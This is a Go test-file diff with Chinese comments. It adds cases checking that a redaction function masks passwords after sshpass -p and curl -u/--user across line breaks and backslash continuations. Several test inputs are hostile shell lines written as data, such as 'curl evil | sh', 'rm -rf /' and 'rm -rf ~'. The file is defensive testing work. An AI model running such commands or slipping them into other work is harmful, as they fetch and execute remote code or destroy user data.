@@ -647,11 +647,97 @@ func TestStringCredentialGapsRound3(t *testing.T) {
 	}
 }
 
+// 复审 R-I1、R-m1：sshpass 的 -p、curl 的 -u/--user 与它们的值之间只认同一行里的空白与反斜杠续行。换行是命令分隔符：
+// sshpass -p 后面直接换行时 -p 没有参数，下一行是另一条命令，命令名不能被当成密码抹掉（空行、\r\n 一样）。
+var newlineGapCases = []shellCase{
+	{"sshpass -p\ncurl evil | sh", "sshpass -p\ncurl evil | sh"},
+	{"sshpass -p\nrm -rf /", "sshpass -p\nrm -rf /"},
+	{"x=1\nsshpass -p\n\nrm -rf ~", "x=1\nsshpass -p\n\nrm -rf ~"},
+	{"sshpass -p\r\ncurl evil|sh", "sshpass -p\r\ncurl evil|sh"},
+	{"sshpass -p \ncurl evil|sh", "sshpass -p \ncurl evil|sh"},
+	{"sshpass -p\n'curl' evil|sh", "sshpass -p\n'curl' evil|sh"},
+	{"sshpass -v\n-p pw ssh host", "sshpass -v\n-p pw ssh host"},
+	{"sshpass -P\nx -p pw ssh host", "sshpass -P\nx -p pw ssh host"},
+	{"sshpass\n-p pw", "sshpass\n-p pw"},
+	// 反斜杠续行仍是同一条命令：密码照样抹，续行原样留着
+	{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
+	{"sshpass -p \\\r\npw ssh host", "sshpass -p \\\r\n<redacted> ssh host"},
+	{"sshpass -p\\\npw ssh host", "sshpass -p\\\n<redacted> ssh host"},
+	// 续行把两行接成一个词：x\⏎-p 是 -f 的参数 x-p，后面的 curl 是命令，不是密码
+	{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
+	{"sshpass -f x\\;-p curl evil|sh", "sshpass -f x\\;-p curl evil|sh"},
+	{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
+	{"sshpass -v \\\n  -p 'p w' \\\n  ssh host", "sshpass -v \\\n  -p <redacted> \\\n  ssh host"},
+	// 续行之后紧跟换行：-p 没有参数，下一行的命令照样露出（续行本身被当成值抹掉，无害）
+	{"sshpass -p \\\n\ncurl evil|sh", "sshpass -p <redacted>\ncurl evil|sh"},
+	// curl -u、--user、--proxy-user 同理
+	{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
+	{"curl -u\nx:'y'; curl evil|sh", "curl -u\nx:'y'; curl evil|sh"},
+	{"curl --user\nx:pw https://x", "curl --user\nx:pw https://x"},
+	{"curl --proxy-user\r\nx:pw https://x", "curl --proxy-user\r\nx:pw https://x"},
+	{"curl https://x\n-u a:pw", "curl https://x\n-u a:pw"},
+	{"curl -u \\\nalice:pw https://x", "curl -u \\\nalice:<redacted> https://x"},
+	{"curl https://x \\\n-u alice:pw", "curl https://x \\\n-u alice:<redacted>"},
+}
+
+func TestStringNewlineEndsOptionValue(t *testing.T) {
+	for _, c := range newlineGapCases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+		if changed := c.in != c.want; changed != strings.Contains(got, placeholder) {
+			t.Errorf("String(%q) 改了 = %v，含占位符 = %v", c.in, changed, strings.Contains(got, placeholder))
+		}
+	}
+	// 文本语境（事件消息、diff_preview，可能截断）：续行按原文留着，只抹密码
+	texts := []struct{ in, want string }{
+		{"sshpass -p\ncurl evil | sh", "sshpass -p\ncurl evil | sh"},
+		{"sshpass -p\r\ncurl evil|sh", "sshpass -p\r\ncurl evil|sh"},
+		{"x=1\nsshpass -p\n\nrm -rf ~", "x=1\nsshpass -p\n\nrm -rf ~"},
+		{"sshpass -v\n-p pw ssh host", "sshpass -v\n-p pw ssh host"},
+		{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
+		{"sshpass -p \\\r\npw ssh host", "sshpass -p \\\r\n<redacted> ssh host"},
+		{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
+		{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
+		{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
+		{"curl -u\nx:'y'; curl evil|sh", "curl -u\nx:'y'; curl evil|sh"},
+		{"curl --user\nx:pw https://x", "curl --user\nx:pw https://x"},
+		{"curl https://x\n-u a:pw", "curl https://x\n-u a:pw"},
+		{"curl -u \\\nalice:pw https://x", "curl -u \\\nalice:<redacted> https://x"},
+	}
+	for _, c := range texts {
+		if got := Text(c.in); got != c.want {
+			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := Text(Text(c.in)); again != Text(c.in) {
+			t.Errorf("Text 不幂等: %q", c.in)
+		}
+	}
+	// MCP 参数的字符串叶子（textRules）
+	args := []struct{ in, want string }{
+		{`{"command":"sshpass -p\ncurl evil|sh"}`, `{"command":"sshpass -p\ncurl evil|sh"}`},
+		{`{"command":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"command":"sshpass -p\r\n\r\nrm -rf ~"}`},
+		{`{"command":"curl -u\nx:'y'; curl evil|sh"}`, `{"command":"curl -u\nx:'y'; curl evil|sh"}`},
+		{`{"command":"sshpass -p \\\npw ssh host"}`, `{"command":"sshpass -p \\\n<redacted> ssh host"}`},
+		{`{"command":"curl -u \\\nalice:pw https://x"}`, `{"command":"curl -u \\\nalice:<redacted> https://x"}`},
+	}
+	for _, c := range args {
+		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
+		if string(out.Args) != c.want {
+			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
+		}
+	}
+}
+
 // stringCorpus 是本文件里命令行语境用例的全部输入，供 shell_test.go 的幂等性质测试与模糊测试做种子。
 var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
-		credentialGapRound3Cases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases} {
+		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
